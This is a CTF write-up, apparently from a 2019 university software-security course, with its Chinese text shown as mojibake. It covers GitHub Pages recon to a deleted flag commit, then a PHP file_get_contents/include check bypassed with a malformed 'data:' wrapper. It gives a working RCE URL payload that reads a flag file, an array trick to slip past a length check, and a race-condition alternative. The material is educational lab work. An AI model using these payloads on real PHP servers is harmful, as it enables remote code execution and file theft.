---
title: "ç¨‹å¼å®‰å…¨::HW3 Write-up"
description: ""
publishDate: "2019-11-21"
category: "CTF"
layout: "../../layouts/ArticleLayout.astro"
---


2019 å¹´äº¤å¤§ç¨‹å¼å®‰å…¨ HW3 write-up
å“ˆå“ˆæ˜¯æˆ‘æ‹‰ğŸ˜ğŸ˜ğŸ˜åŠ©æ•™æ‹‰ğŸ¤™ğŸ¤™ğŸ¤™

# Unexploitable [100 point]

## Recon

ç°¡å–®æª¢æŸ¥ä¸€ä¸‹ç¶²é åŸå§‹ç¢¼ï¼Œå¯ä»¥ç™¼ç¾ç¶²é å¾ˆç°¡å–®ï¼Œåªæœ‰ Matrix rain ç‰¹æ•ˆçš„ javascript é‚„æœ‰ä¸€å€‹æª¢æŸ¥ konami ç§˜æŠ€çš„ k.jsï¼Œ
cookie çš„éƒ¨åˆ†ä¹Ÿæ²’æœ‰ä»€éº¼å¥½çœ‹çš„ï¼Œä¾†æª¢æŸ¥ä¸€ä¸‹ header å¯ä»¥ç™¼ç¾è©²ç¶²é å¯èƒ½æ˜¯æ¶åœ¨ github ä¸Šçš„æŸå€‹éœæ…‹ç¶²ç«™ã€‚

```sh
$ curl -kI https://unexploitable.kaibro.tw/
HTTP/2 200
server: GitHub.com
content-type: text/html; charset=utf-8
last-modified: Thu, 17 Oct 2019 10:11:00 GMT
etag: "5da83e34-4f2"
access-control-allow-origin: *
expires: Wed, 20 Nov 2019 17:32:45 GMT
cache-control: max-age=600
x-proxy-cache: MISS
x-github-request-id: C7D4:5C02:1DA1BF:25B879:5DD57664
accept-ranges: bytes
date: Wed, 20 Nov 2019 17:22:46 GMT
via: 1.1 varnish
age: 0
x-served-by: cache-hkg17931-HKG
x-cache: MISS
x-cache-hits: 0
x-timer: S1574270566.811443,VS0,VE228
vary: Accept-Encoding
x-fastly-request-id: bc1e55a82c40be45132ceda0c55024153b3be9fb
content-length: 1266
```

åˆæˆ–è€…æ˜¯åœ¨è¨ªå• url ï¼Œä¾‹å¦‚ https://unexploitable.kaibro.tw/test ï¼Œæ™‚å¯èƒ½æœƒå¾—åˆ°éŒ¯èª¤ï¼š

<Image src="./unexploitable.png" alt="" />

æ„Ÿè¦º github ä¸Šæ‡‰è©²æœ‰è—å¯¶ï¼Œå˜—è©¦å…ˆæ‰¾åˆ° repoï¼Œé€é dig æŒ‡ä»¤æ‰¾åˆ° unexploitable.kaibro.tw. æ˜¯ bucharesti.github.io. çš„ CNAMEï¼š

```sh
$ dig unexploitable.kaibro.tw

; <<>> DiG 9.10.6 <<>> unexploitable.kaibro.tw
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 36406
;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 8, ADDITIONAL: 13

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;unexploitable.kaibro.tw.	IN	A

;; ANSWER SECTION:
unexploitable.kaibro.tw. 3078	IN	CNAME	bucharesti.github.io.
bucharesti.github.io.	3078	IN	A	185.199.109.153
bucharesti.github.io.	3078	IN	A	185.199.110.153
bucharesti.github.io.	3078	IN	A	185.199.111.153
bucharesti.github.io.	3078	IN	A	185.199.108.153
```

æ‰¾åˆ° repo å¾Œå¯ä»¥ç™¼ç¾ç›®å‰çš„ç‰ˆæœ¬æ˜¯æ²’æœ‰ flag çš„ï¼ŒæŸ¥çœ‹ commit ç´€éŒ„å¯ä»¥ç™¼ç¾æœ‰æ¢ commit message æ˜¯ `delete secret file`:

<Image src="./unex_2.png" alt="" />

å¯ä»¥åœ¨è£¡é¢æ‰¾åˆ° flag : `FLAG{baby_recon_dont_forget_to_look_github_page}`

# Safe R/W [200 point]

## Recon

é¦–å…ˆé–±è®€ä¸€ä¸‹ source codeï¼Œå¯ä»¥çŸ¥é“æµç¨‹å¤§æ¦‚æ˜¯ï¼š

1. æ ¹æ“šä½¿ç”¨è€…æŒ‡ç´‹å»ºç«‹ä¸€å€‹ sandbox
2. å¯æŒ‡å®šè¦å»ºç«‹çš„è³‡æ–™å¤¾åç¨± `$f`ï¼Œwaf æª¢æŸ¥ä¸åŒ…å« `.` `/` `-` ä»»ä¸€å­—å…ƒ
3. å¯æŒ‡å®šè¦è¢« `include` çš„æª”æ¡ˆåç¨± `$i`ï¼Œwaf æª¢æŸ¥ä¸åŒ…å« `ph` å­—ä¸²
4. å¯æŒ‡å®šè¦å¾€æª”æ¡ˆ `meow` å¯«å…¥çš„å…§å®¹ `$c`ï¼Œwaf æª¢æŸ¥é•·åº¦ä¸è¶…é 20 bytes
5. åˆªé™¤è³‡æ–™å¤¾

ç”±æ–¼ 5. æœƒåˆªé™¤è³‡æ–™å¤¾ï¼Œæ‰€ä»¥æˆ‘å€‘å¿…é ˆè¦åœ¨ `@include($i);` çš„æ™‚å€™å°±è®“ä»–åŸ·è¡Œ php ç¨‹å¼ç¢¼ï¼Œæˆ–è€…æ˜¯ç›´æ¥æŠŠ flag include é€²ä¾†ï¼Œ
ä½†æ˜¯ä½œæ¥­æœ‰èªª `open_basedir=/var/www/html/` å¯ä»¥ç›´æ¥å‡è¨­ flag åœ¨é€™å€‹è³‡æ–™å¤¾ä¹‹å¤–ï¼Œæ‰€ä»¥å…ˆä¸è€ƒæ…®ç¬¬äºŒæ¢è·¯ã€‚

åˆ°é€™è£¡å¯ä»¥ç™¼ç¾æˆ‘å€‘é¦–å…ˆè¦è§£æ±ºçš„é›£é»æ˜¯å¦‚ä½•é€šéé€™å€‹æª¢æŸ¥ï¼Œè®“æˆ‘å€‘å¯ä»¥æŠŠ `<?php` å¡é€²å»æˆ‘å€‘è¦ include çš„æª”æ¡ˆä¾† RCEï¼š

```php
stripos(file_get_contents($i), '<') === FALSE
```

## Exploit

é¦–å…ˆæˆ‘æœ‰å€‹å¤§è†½çš„æƒ³æ³•ï¼Œç¬¬ä¸€è¡Œæ¸¬ä¸åˆ° `'<?php'`ï¼Œç¬¬å››è¡Œåˆè·‘å‡º `'<?php'` ä¸å°±æ´—æ´—ç¡äº†å—

```php
if(isset($i) && stripos(file_get_contents($i), '<') === FALSE) {
    echo "<div class='container'>";
    echo "<h2>Here is your file content:</h2>";
    @include($i);
    echo "</div>";
}
```

çœ‹åˆ° `file_get_contents` æ‡‰è©²æœƒæƒ³åˆ°å„ç¨® protocols è·Ÿ wrappersï¼Œ
æ¥ä¸‹ä¾†å¯ä»¥é€é `php -a` æ‰“é–‹ php çš„ interactive shell åšç°¡å–®çš„æ¸¬è©¦ï¼Œ
php åœ¨ defualt çš„æƒ…æ³ä¸‹å°æ–¼é–‹æª”é‚„æœ‰ include çš„è¨­ç½®å¦‚ä¸‹ï¼š

```php
phpinfo();
...
allow_url_fopen => On => On
allow_url_include => Off => Off
```

ä¸€å€‹æœ‰é–‹ä¸€å€‹æ²’é–‹ï¼Œ
ä¹Ÿå°±æ˜¯èªªæˆ‘å€‘å¯èƒ½å¯ä»¥é€é protocols/wrapper ä¾†è®“æª¢æŸ¥çš„å…§å®¹èˆ‡å¯¦éš›ä¸Šè¢«å‘ˆç¾çš„å…§å®¹ç”¢ç”Ÿä¸ä¸€è‡´ï¼Œ
é€™è£¡å¯ä»¥æšèˆ‰[å„ç¨®æ”¯æ´çš„ protocols/wrapper](https://www.php.net/manual/en/wrappers.php)ï¼Œ
ç„¶å¾Œæ—¢ç„¶éƒ½çµ¦ source code äº†ï¼Œç›´æ¥æ•´ä»½æ‹¿ä¸‹ä¾†æ¶èµ·ä¾† debug æœ€å¿«ï¼Œé€™è£¡é †æ‰‹æ‰“é–‹ error messageï¼š

```php
ini_set('display_errors','1');
error_reporting(E_ALL);
```

å‡è¨­é‡åˆ°ä¸æ”¯æ´ï¼ˆåŒ…æ‹¬æœªé–‹å•Ÿï¼‰ï¼Œé è¨­æœƒä½¿ç”¨ `file://` ä¹Ÿå°±æ˜¯ç›´æ¥ç•¶æª”æ¡ˆè®€ï¼Œæ‰€ä»¥å¯ä»¥é€éä¸‹åˆ—æ–¹å¼ä¾†æ¸¬è©¦æ˜¯å¦å¯ä»¥åˆ©ç”¨ï¼š

<Image src="./safeRW.png" alt="" />

å¤§éƒ¨åˆ†çš„ protocols/wrapper éƒ½éœ€è¦åœ¨ config php çš„æ™‚å€™é–‹å•Ÿï¼ŒåŸºæœ¬ä¸Šä¸æœŸå¾…é ç«¯æœ‰æ‰“é–‹ï¼Œè©¦ä¸‹å»æ„Ÿè¦ºä¹Ÿæ˜¯æ²’æœ‰ï¼Œ
æœ¬ä¾†çŒœæƒ³ç°¡å–®çš„ `http:` è·Ÿ `http:///meow` æ‡‰è©²å¯ä»¥é¨™é file_get_contents å»æ‹¿å–å¤–éƒ¨è³‡æºï¼Œç„¶å¾Œåœ¨ include æ™‚è¢«ç•¶ä½œè·¯å¾‘ï¼Œ
ä½†æœƒç™¼ç¾é›–ç„¶ include æ²’å•Ÿç”¨ url ä½†æ˜¯é‡åˆ° `data://` è·Ÿ `http://` é‚„æ˜¯æœƒåéŒ¯èª¤çµ¦ä½ ï¼Œ
å¯ä»¥ç™¼ç¾æˆ‘å€‘çš„è¼¸å…¥ä¸æœƒè¢«ç•¶ä½œè·¯å¾‘ï¼Œåè€Œæœƒæ˜¯èªªé€™å€‹ protocol ä¸å…è¨±ç„¶å¾Œç›´æ¥çˆ›æ‰

```php
Warning: include(): data:// wrapper is disabled in the server configuration by allow_url_include=0 in /var/www/html/asdfasdfasdfasdf.php on line 46

Warning: include(data://meow): failed to open stream: no suitable wrapper could be found in /var/www/html/asdfasdfasdfasdf.php on line 46

Warning: include(): Failed opening 'data://meow' for inclusion (include_path='.:/usr/share/php') in /var/www/html/asdfasdfasdfasdf.php on line 46
```

è©¦åˆ° `data://` çš„æ™‚å€™å¯ä»¥çœ‹åˆ°ä¸‹é¢æœ‰å€‹äººåœ¨ 11 å¹´å‰å‘Šè¨´ä½  `data:` ä¹Ÿæ˜¯æ”¯æ´çš„ï¼Œåœ¨ local æ¸¬ä¸€ä¸‹ `data:`è·Ÿ `data:/meow` çš„çµ„åˆï¼š

```php
Warning: file_get_contents(data:/meow): failed to open stream: rfc2397: no comma in URL in /var/www/html/asdfasdfasdfasdf.php on line 41
```

ç™¼ç¾ä»–æœƒåœ¨ `file_get_contents` æ™‚åƒ warning ä½†æ˜¯ `include`å»æ²’å™´æ±è¥¿å‡ºä¾†ï¼ï¼
æ‰€ä»¥é€™è£¡å¯ä»¥é€éæœ‰æ®˜ç¼ºçš„ `data:` å½¢å¼è®“ `file_get_contents` æ‰“ä¸é–‹æª”æ¡ˆå°è‡´å›å‚³ `false` å¾è€Œé€šéåˆ¤æ–·ï¼š

```php
php > $i = "zzz";
php > var_dump(file_get_contents($i));

Warning: file_get_contents(zzz): failed to open stream: No such file or directory in php shell code on line 1
bool(false)
php > var_dump(stripos(file_get_contents($i), '<'));

Warning: file_get_contents(zzz): failed to open stream: No such file or directory in php shell code on line 1
bool(false)
```

ç•¶ç„¶ä½ ä¹Ÿå¯ä»¥é¸æ“‡é€éæ­£å¸¸çš„çµ„åˆä¾†é€šéåˆ¤æ–· `data:,` è·Ÿ `data:,/meow` (`data:,/meow` å°±æ˜¯ plain text çš„ `/meow`)ï¼š

```php
php > $i = "data:,/meow";
php > var_dump(file_get_contents($i));
string(5) "/meow"
php > var_dump(stripos(file_get_contents($i), '<') );
bool(false)
```

åˆ°é€™è£¡æˆ‘å€‘å°±å¯ä»¥ RCE äº†ï¼š

<Image src="./exploit.png" alt="" />

ç•¶ç„¶å¯ä»¥ç”¨ 20 byte çš„ payload å°±æŠŠ flag çŒœå‡ºä¾†
ä½†é‚„æ˜¯æœ‰é»ä¸è‡ªç”±ï¼Œæœ‰ç‰†å°±è¦çˆ¬ä¸€ä¸‹ï¼Œé€™é‚Šæ‹¿ä¸Šèª²æ•™çš„æ±è¥¿éš¨ä¾¿æˆ³å€‹:

```php
php > $c = array('ls',' -la ',' ../../../');
php > var_dump(strlen($c) > 20);
bool(false)
php > file_put_contents("meow", $c);
php > echo file_get_contents("meow");
ls -la  ../../../
```

ç„¶å¾Œä½ å°±å¯ä»¥æ„›æ€éº¼æ‰“æ€éº¼æ‰“ï¼š

`https://edu-ctf.csie.org:10155/?f=data%3A&i=data%3A%2Fmeow&c[]=%3C%3Fphp+echo+%60cat+../../../../../../../../../../../../../../../../../../flag_is_here%60%3B`

flag: `FLAG{w3lc0me_t0_th3_PHP_W0r1d}`

## Other Solution

å‰é¢æåˆ°çš„ä¸»è¦æ€è·¯å°±æ˜¯ï¼š

>æˆ‘æœ‰å€‹å¤§è†½çš„æƒ³æ³•ï¼Œç¬¬ä¸€è¡Œæ¸¬ä¸åˆ° `'<?php'`ï¼Œç¬¬å››è¡Œåˆè·‘å‡º `'<?php'`

é€™å¯ä»¥é€é race condition ä¾†é”æˆï¼Œ
å› ç‚ºä¸€å››è¡Œé–“è®€å–çš„æ™‚é–“å·®ï¼Œé‚„æœ‰æ ¹æ“šç›¸åŒçš„ ip ï¼Œ useragent æˆ‘å€‘æœƒä¸€ç›´å­˜å–åˆ°åŒä¸€å€‹è³‡æ–™å¤¾ï¼Œ
é€éå¤šå€‹ client æˆ‘å€‘å¯ä»¥æ’åˆ°å¹¾æ¬¡ä»–æª¢æŸ¥å®Œæˆ‘å€‘åˆæŠŠå…§å®¹æ”¹æ‰ï¼Œè®“å·²ç¶“é€šéæª¢æŸ¥çš„ server å» include æˆ‘å€‘ä¿®æ”¹éçš„ meowã€‚